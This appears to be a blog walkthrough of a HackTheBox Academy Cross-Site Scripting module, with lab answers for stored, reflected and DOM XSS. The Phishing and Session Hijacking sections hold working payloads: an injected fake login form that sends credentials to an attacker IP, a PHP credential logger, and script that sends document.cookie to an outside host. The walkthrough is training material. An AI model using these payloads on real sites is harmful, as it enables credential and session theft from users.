---
title: "[HTB_Academy] Cross-Site Scripting (XSS)"
excerpt: "**Cross-Site Scripting (XSS)** Module Walkthrough - HackTheBox Academy"
header:
  overlay_image: /assets/images/HTB_Cross-Site_Scripting_(XSS)/banner.png
  teaser: /assets/images/HTB_Cross-Site_Scripting_(XSS)/upper.png
  og_image: /assets/images/HTB_Cross-Site_Scripting_(XSS)/upper.png
categories:
  - HTB-Academy
tags:
  - HTB-Academy
  - Bug Bounty Hunter
  - Penetration Tester
  - Web
  - OWASP TOP 10
layout: single
toc: true
---
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\upper.png)

## Disclaimer
<img style="float: left; padding-right:10px" src="\assets\images\disclaimer.png" width="110" height="110">

<div style="text-align: justify">The following post may contain spoilers. Use it as a guide or support. It is always better to try it by yourself!</div>
<div style="text-align: justify">Enjoy :)</div>

## Resources
<img style="float: left; padding-right:10px" src="\assets\images\github.avif" width="110" height="110">
<div style="text-align: justify">All resources can be found in the following GitHub repository:</div>
[R4fik1-HTB_Cross-Site_Scripting_Repository](https://github.com/r4fik1/HTB_Academy/tree/main/HTB_Cross-Site_Scripting)

## Module Summary

Web Application Penetration Testing is a vital part of any penetration test. It plays an essential role in identifying critical vulnerabilities that may lead to the organization's assets being compromised. Cross-Site Scripting (XSS) vulnerabilities are among the most common vulnerabilities in any web application, with studies indicating that over 80% of all web applications are vulnerable to it. An XSS vulnerability may allow an attacker to execute arbitrary JavaScript code within the target's browser, leading to various types of attacks, including compromising web admins and their web applications.

While many organizations choose to ignore XSS vulnerabilities, as it only affects end-users without having a direct ability to execute code on the back-end server, in this module, we will discuss why XSS should be taken seriously. We will discuss the three types of XSS vulnerabilities, how to identify them, and how to exploit them.

In addition to this, the Cross-Site Scripting (XSS) module will teach you the following:

  - What is an XSS vulnerability?
  - History of XSS attacks in real-life
  - What are Stored XSS, Reflected XSS, and DOM-based XSS vulnerabilities
  - Techniques to identify XSS vulnerabilities
  - Performing Defacing attacks to change the look of a website
  - Performing Phishing attacks to steal the victim's login details and to perform a phishing simulation exercise
  - Performing Session Hijacking attacks to obtain the victim's session cookie and use them to access their account
  - Front-end and Back-end steps to prevent XSS vulnerabilities and protect your web application against them
  

## Stored XSS
 
>**Q. To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.**


<div style="text-align: justify">1. </div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q1\1.png)

<div style="text-align: justify">2. </div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q1\2.png)

```javascript
<script>alert(document.cookie)</script>
```

## Reflected XSS

>**Q. To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.**

<div style="text-align: justify">3. </div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q2\1.png)

<div style="text-align: justify">4. </div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q2\2.png)

```javascript
<script>alert(document.cookie)</script>
```

## DOM XSS
 
>**Q. To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.**

<div style="text-align: justify">5. </div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q3\1.png)

<div style="text-align: justify">6. </div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q3\2.png)

```javascript
<img src="" onerror=alert(document.cookie)>
```

## XSS Discovery

>**Q. Utilize some of the techniques mentioned in this section to identify the vulnerable input parameter found in the above server. What is the name of the vulnerable parameter? **

>**Q. What type of XSS was found on the above server? "name only"**

## Phishing

>**Q. Try to find a working XSS payload for the Image URL form found at '/phishing' in the above server, and then use what you learned in this section to prepare a malicious URL that injects a malicious login form. Then visit '/phishing/send.php' to send the URL to the victim, and they will log into the malicious login form. If you did everything correctly, you should receive the victim's login credentials, which you can use to login to '/phishing/login.php' and obtain the flag.**

<div style="text-align: justify">1. </div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q5\1.png)

<div style="text-align: justify">2. </div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q5\2.png)

<div style="text-align: justify">1. </div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q5\3.png)

<div style="text-align: justify">2. </div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q5\4.png)

<div style="text-align: justify">1. </div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q5\5.png)

<div style="text-align: justify">2. </div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q5\6.png)

<div style="text-align: justify">1. </div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q5\7.png)

<div style="text-align: justify">2. </div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q5\8.png)

<div style="text-align: justify">1. </div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q5\9.png)

<div style="text-align: justify">2. </div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q5\10.png)

<div style="text-align: justify">1. </div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q5\11.png)

<div style="text-align: justify">2. </div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q5\12.png)

```bash
http://10.129.252.57/phishing/index.php?url=<script>alert(window.origin)</script>
```

```bash
http://10.129.252.57/phishing/index.php?url=document.write('<h3>Please login to continue</h3><form action=http://10.10.14.46><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

```bash
http://10.129.252.57/phishing/index.php?url=%27/%3E%3Cscript%3Edocument.write(%27%3Ch3%3EPlease%20login%20to%20continue%3C/h3%3E%3Cform%20action=http://10.10.14.46:3333%3E%3Cinput%20type=%22username%22%20name=%22username%22%20placeholder=%22Username%22%3E%3Cinput%20type=%22password%22%20name=%22password%22%20placeholder=%22Password%22%3E%3Cinput%20type=%22submit%22%20name=%22submit%22%20value=%22Login%22%3E%3C/form%3E%27);document.getElementById(%27urlform%27).remove();%3C/script%3E%3C!--
```

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```


## Session Hijacking

>**Q. Try to repeat what you learned in this section to identify the vulnerable input field and find a working XSS payload, and then use the 'Session Hijacking' scripts to grab the Admin's cookie and use it in 'login.php' to get the flag.**

<div style="text-align: justify">1. </div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q6\1.png)

<div style="text-align: justify">2. </div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q6\2.png)

<div style="text-align: justify">1. </div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q6\3.png)

<div style="text-align: justify">2. </div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q6\4.png)

<div style="text-align: justify">1. </div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q6\5.png)

<div style="text-align: justify">2. </div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q6\6.png)

<div style="text-align: justify">1. </div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q6\7.png)

<div style="text-align: justify">2. </div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q6\8.png)

<div style="text-align: justify">1. </div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q6\9.png)

<div style="text-align: justify">2. </div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q6\10.png)



Look for the payload

```javascript
"><script src=http://10.10.14.46:3333></script>
```

Tip: We will notice that the email must match an email format, even if we try manipulating the HTTP request parameters, as it seems to be validated on both the front-end and the back-end. Hence, the email field is not vulnerable, and we can skip testing it. Likewise, we may skip the password field, as passwords are usually hashed and not usually shown in cleartext. This helps us in reducing the number of potentially vulnerable input fields we need to test.

Look for the position
```javascript
"><script src=http://10.10.14.46:3333/fullname></script>
"><script src=http://10.10.14.46:3333/username></script>
"><script src=http://10.10.14.46:3333/password></script>
"><script src=http://10.10.14.46:3333/url></script>
```

```javascript
new Image().src='http://10.10.14.46:3333/index.php?c='+document.cookie
```

Click on "+" to add the cookie

## Skills Assessment

>**Q. What is the value of the 'flag' cookie?**

<div style="text-align: justify">1. </div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q7\1.png)

<div style="text-align: justify">2. </div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q7\2.png)

<div style="text-align: justify">1. </div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q7\3.png)

<div style="text-align: justify">2. </div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q7\4.png)

<div style="text-align: justify">1. </div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q7\5.png)

<div style="text-align: justify">2. </div><br>
![image-center](\assets\images\HTB_Cross-Site_Scripting_(XSS)\Q7\6.png)